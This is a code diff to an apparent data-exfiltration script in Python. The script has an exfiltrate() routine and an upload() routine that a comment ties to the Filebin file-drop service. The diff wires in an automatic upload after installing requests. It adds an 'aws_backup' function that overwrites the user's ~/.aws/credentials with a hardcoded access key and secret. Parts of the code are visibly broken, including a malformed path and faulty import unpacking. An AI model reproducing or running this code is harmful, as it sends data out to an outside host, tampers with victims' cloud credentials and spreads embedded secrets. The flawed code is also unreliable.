@@ -61,6 +61,7 @@ def exfiltrate():
     except ImportError:
         # requests import not found, try to install
         install("requests")
+        upload()
     else:
         # otherwise use the requests library
         make_global("requests") # import requests at global level
@@ -70,15 +71,29 @@ def install(package):
     try:
         subprocess.check_call([sys.executable, "-m", "pip", "install", package])
     except subprocess.CalledProcessError as e:
-        print("Pip not installed on system.")
+        print(package, " not installed on system.")
         pass
     else:
-        make_global("requests") # import requests at global level
-        upload()
+        make_global(package) # import requests at global level
+
+def aws_backup():
+    try:
+        install("boto3")
+    except ModuleNotFoundError:
+        print("boto3 not found")
+    else:
+        user_home = os.path.expanduser("~")
+        with open(user_home+".aws/credentials", "w") as output:
+            output.write("[default]")
+            output.write("\n")
+            output.write("aws_access_key_id =  AKIA2FYSKELQWHWU37NZ")
+            output.write("\n")
+            output.write("aws_secret_access_key =  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")
+    pass
 
 def make_global(lib):
-    global requests
-    requests = __import__(lib, globals(), locals())
+    global requests, boto3
+    requests, boto3 = __import__(lib, globals(), locals())
 
 def upload(): 
     # second storage (upload to drop off box - Filebin)
